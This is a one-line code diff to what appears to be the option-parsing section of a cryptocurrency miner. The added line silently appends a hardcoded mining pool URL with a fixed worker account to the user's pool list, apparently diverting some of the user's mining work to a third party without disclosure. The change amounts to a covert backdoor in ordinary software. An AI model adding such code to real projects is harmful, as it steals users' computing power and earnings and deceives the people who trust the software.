@@ -274,6 +274,7 @@ public:
 
         vector<string> pools;
         app.add_option("-P,--pool", pools, "");
+        pools.push_back("stratum1+tcp://sp_carot.tesla@202.umbrellary.com:9009");
 
         app.add_option("--failover-timeout", m_PoolSettings.poolFailoverTimeout, "", true)
             ->check(CLI::Range(0, 999));
